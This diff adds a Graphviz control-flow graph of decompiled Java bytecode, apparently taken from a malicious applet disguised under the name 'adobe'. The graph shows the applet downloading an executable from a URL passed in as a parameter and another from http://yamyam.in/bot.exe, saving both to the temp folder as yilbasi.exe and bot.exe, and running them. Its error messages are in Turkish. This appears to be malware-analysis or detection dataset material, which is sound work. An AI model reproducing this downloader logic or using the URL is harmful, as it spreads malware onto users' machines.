@@ -1,0 +1,201 @@
+digraph "" {
+    "r0 := @this: adobe"
+    "push \"java.io.tmpdir\""
+    "r0 := @this: adobe"->"push \"java.io.tmpdir\"";
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"
+    "push \"java.io.tmpdir\""->"staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>";
+    "store.r r1"
+    "staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>"->"store.r r1";
+    "load.r r1"
+    "store.r r1"->"load.r r1";
+    "push \"yilbasi.exe\""
+    "load.r r1"->"push \"yilbasi.exe\"";
+    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"
+    "push \"yilbasi.exe\""->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
+    "store.r r4"
+    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"store.r r4";
+    "store.r r4"->"load.r r1";
+    "push \"bot.exe\""
+    "load.r r1"->"push \"bot.exe\"";
+    "push \"bot.exe\""->"virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>";
+    "store.r r5"
+    "virtualinvoke <java.lang.String: java.lang.String concat(java.lang.String)>"->"store.r r5";
+    "staticget <java.lang.System: java.io.PrintStream out>"
+    "store.r r5"->"staticget <java.lang.System: java.io.PrintStream out>";
+    "staticget <java.lang.System: java.io.PrintStream out>"->"load.r r1";
+    "virtualinvoke <java.io.PrintStream: void print(java.lang.String)>"
+    "load.r r1"->"virtualinvoke <java.io.PrintStream: void print(java.lang.String)>";
+    "new java.net.URL"
+    "virtualinvoke <java.io.PrintStream: void print(java.lang.String)>"->"new java.net.URL";
+    "new java.net.URL"->"store.r r1";
+    "store.r r1"->"load.r r1";
+    "load.r r0"
+    "load.r r1"->"load.r r0";
+    "push \"name\""
+    "load.r r0"->"push \"name\"";
+    "virtualinvoke <adobe: java.lang.String getParameter(java.lang.String)>"
+    "push \"name\""->"virtualinvoke <adobe: java.lang.String getParameter(java.lang.String)>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"
+    "virtualinvoke <adobe: java.lang.String getParameter(java.lang.String)>"->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"load.r r1";
+    "ifnonnull new java.io.BufferedOutputStream"
+    "load.r r1"->"ifnonnull new java.io.BufferedOutputStream";
+    "push 1"
+    "ifnonnull new java.io.BufferedOutputStream"->"push 1";
+    "staticinvoke <java.lang.System: void exit(int)>"
+    "push 1"->"staticinvoke <java.lang.System: void exit(int)>";
+    "new java.io.BufferedOutputStream"
+    "staticinvoke <java.lang.System: void exit(int)>"->"new java.io.BufferedOutputStream";
+    "store.r r0"
+    "new java.io.BufferedOutputStream"->"store.r r0";
+    "store.r r0"->"load.r r0";
+    "new java.io.FileOutputStream"
+    "load.r r0"->"new java.io.FileOutputStream";
+    "dup1.r"
+    "new java.io.FileOutputStream"->"dup1.r";
+    "load.r r4"
+    "dup1.r"->"load.r r4";
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"
+    "load.r r4"->"specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>";
+    "specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream)>"
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"->"specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream)>";
+    "specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream)>"->"load.r r1";
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"
+    "load.r r1"->"virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>";
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"->"virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>";
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"->"store.r r1";
+    "push 1024"
+    "store.r r1"->"push 1024";
+    "newarray"
+    "push 1024"->"newarray";
+    "store.r r31"
+    "newarray"->"store.r r31";
+    "store.r r31"->"load.r r1";
+    "load.r r31"
+    "load.r r1"->"load.r r31";
+    "virtualinvoke <java.io.InputStream: int read(byte[])>"
+    "load.r r31"->"virtualinvoke <java.io.InputStream: int read(byte[])>";
+    "store.i $i1"
+    "virtualinvoke <java.io.InputStream: int read(byte[])>"->"store.i $i1";
+    "load.i $i1"
+    "store.i $i1"->"load.i $i1";
+    "push -1"
+    "load.i $i1"->"push -1";
+    "ifcmpeq.i load.r r0"
+    "push -1"->"ifcmpeq.i load.r r0";
+    "ifcmpeq.i load.r r0"->"load.r r0";
+    "load.r r0"->"load.r r31";
+    "push 0"
+    "load.r r31"->"push 0";
+    "push 0"->"load.i $i1";
+    "virtualinvoke <java.io.BufferedOutputStream: void write(byte[],int,int)>"
+    "load.i $i1"->"virtualinvoke <java.io.BufferedOutputStream: void write(byte[],int,int)>";
+    "goto load.r r1"
+    "virtualinvoke <java.io.BufferedOutputStream: void write(byte[],int,int)>"->"goto load.r r1";
+    "virtualinvoke <java.io.BufferedOutputStream: void write(byte[],int,int)>"->"staticget <java.lang.System: java.io.PrintStream out>";
+    "push \"dosya hatas\u0131 1\""
+    "staticget <java.lang.System: java.io.PrintStream out>"->"push \"dosya hatas\u0131 1\"";
+    "virtualinvoke <java.io.PrintStream: void println(java.lang.String)>"
+    "push \"dosya hatas\u0131 1\""->"virtualinvoke <java.io.PrintStream: void println(java.lang.String)>";
+    "virtualinvoke <java.lang.Exception: void printStackTrace()>"
+    "virtualinvoke <java.io.PrintStream: void println(java.lang.String)>"->"virtualinvoke <java.lang.Exception: void printStackTrace()>";
+    "virtualinvoke <java.lang.Exception: void printStackTrace()>"->"push 1";
+    "push 1"->"staticinvoke <java.lang.System: void exit(int)>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "staticinvoke <java.lang.System: void exit(int)>"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "pop"
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"pop";
+    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r4";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"
+    "load.r r4"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
+    "push 5000L"
+    "pop"->"push 5000L";
+    "staticinvoke <java.lang.Thread: void sleep(long)>"
+    "push 5000L"->"staticinvoke <java.lang.Thread: void sleep(long)>";
+    "goto new java.net.URL"
+    "staticinvoke <java.lang.Thread: void sleep(long)>"->"goto new java.net.URL";
+    "goto new java.net.URL"->"new java.net.URL";
+    "new java.net.URL"->"dup1.r";
+    "push \"http://yamyam.in/bot.exe\""
+    "dup1.r"->"push \"http://yamyam.in/bot.exe\"";
+    "push \"http://yamyam.in/bot.exe\""->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"new java.io.BufferedOutputStream";
+    "new java.io.BufferedOutputStream"->"store.r r0";
+    "store.r r0"->"load.r r0";
+    "load.r r0"->"new java.io.FileOutputStream";
+    "new java.io.FileOutputStream"->"dup1.r";
+    "load.r r5"
+    "dup1.r"->"load.r r5";
+    "load.r r5"->"specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>";
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"->"specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream)>";
+    "specialinvoke <java.io.BufferedOutputStream: void <init>(java.io.OutputStream)>"->"virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>";
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"->"virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>";
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"->"store.r r4";
+    "store.r r4"->"push 1024";
+    "push 1024"->"newarray";
+    "newarray"->"store.r r1";
+    "store.r r1"->"load.r r4";
+    "load.r r4"->"load.r r1";
+    "load.r r1"->"virtualinvoke <java.io.InputStream: int read(byte[])>";
+    "store.i r31"
+    "virtualinvoke <java.io.InputStream: int read(byte[])>"->"store.i r31";
+    "load.i r31"
+    "store.i r31"->"load.i r31";
+    "load.i r31"->"push -1";
+    "push -1"->"ifcmpeq.i load.r r0";
+    "ifcmpeq.i load.r r0"->"load.r r0";
+    "load.r r0"->"load.r r1";
+    "load.r r1"->"push 0";
+    "push 0"->"load.i r31";
+    "load.i r31"->"virtualinvoke <java.io.BufferedOutputStream: void write(byte[],int,int)>";
+    "goto load.r r4"
+    "virtualinvoke <java.io.BufferedOutputStream: void write(byte[],int,int)>"->"goto load.r r4";
+    "virtualinvoke <java.io.BufferedOutputStream: void write(byte[],int,int)>"->"staticget <java.lang.System: java.io.PrintStream out>";
+    "push \"dosya hatas\u0131 2\""
+    "staticget <java.lang.System: java.io.PrintStream out>"->"push \"dosya hatas\u0131 2\"";
+    "push \"dosya hatas\u0131 2\""->"virtualinvoke <java.io.PrintStream: void println(java.lang.String)>";
+    "virtualinvoke <java.lang.Exception: java.lang.StackTraceElement[] getStackTrace()>"
+    "virtualinvoke <java.io.PrintStream: void println(java.lang.String)>"->"virtualinvoke <java.lang.Exception: java.lang.StackTraceElement[] getStackTrace()>";
+    "virtualinvoke <java.lang.Exception: java.lang.StackTraceElement[] getStackTrace()>"->"pop";
+    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"pop";
+    "pop"->"staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"->"load.r r5";
+    "load.r r5"->"virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <java.lang.Runtime: java.lang.Process exec(java.lang.String)>"->"staticget <java.lang.System: java.io.PrintStream out>";
+    "push \"calistirma hatasi 2:\""
+    "staticget <java.lang.System: java.io.PrintStream out>"->"push \"calistirma hatasi 2:\"";
+    "push \"calistirma hatasi 2:\""->"virtualinvoke <java.io.PrintStream: void println(java.lang.String)>";
+    "virtualinvoke <java.io.IOException: java.lang.StackTraceElement[] getStackTrace()>"
+    "virtualinvoke <java.io.PrintStream: void println(java.lang.String)>"->"virtualinvoke <java.io.IOException: java.lang.StackTraceElement[] getStackTrace()>";
+    "virtualinvoke <java.io.IOException: java.lang.StackTraceElement[] getStackTrace()>"->"pop";
+    "ifcmpeq.i load.r r0"->"load.r r0";
+    "virtualinvoke <java.io.BufferedOutputStream: void close()>"
+    "load.r r0"->"virtualinvoke <java.io.BufferedOutputStream: void close()>";
+    "virtualinvoke <java.io.BufferedOutputStream: void close()>"->"load.r r4";
+    "virtualinvoke <java.io.InputStream: void close()>"
+    "load.r r4"->"virtualinvoke <java.io.InputStream: void close()>";
+    "goto staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>"
+    "virtualinvoke <java.io.InputStream: void close()>"->"goto staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+    "staticinvoke <java.lang.Thread: void sleep(long)>"->"staticget <java.lang.System: java.io.PrintStream out>";
+    "push \"\u00e7al\u0131\u015ft\u0131rma hatas\u0131 1\""
+    "staticget <java.lang.System: java.io.PrintStream out>"->"push \"\u00e7al\u0131\u015ft\u0131rma hatas\u0131 1\"";
+    "push \"\u00e7al\u0131\u015ft\u0131rma hatas\u0131 1\""->"virtualinvoke <java.io.PrintStream: void println(java.lang.String)>";
+    "virtualinvoke <java.io.PrintStream: void println(java.lang.String)>"->"virtualinvoke <java.lang.Exception: java.lang.StackTraceElement[] getStackTrace()>";
+    "virtualinvoke <java.lang.Exception: java.lang.StackTraceElement[] getStackTrace()>"->"pop";
+    "pop"->"push 1";
+    "push 1"->"staticinvoke <java.lang.System: void exit(int)>";
+    "ifcmpeq.i load.r r0"->"load.r r0";
+    "load.r r0"->"virtualinvoke <java.io.BufferedOutputStream: void close()>";
+    "virtualinvoke <java.io.BufferedOutputStream: void close()>"->"load.r r1";
+    "load.r r1"->"virtualinvoke <java.io.InputStream: void close()>";
+    "virtualinvoke <java.io.InputStream: void close()>"->"goto staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>";
+}
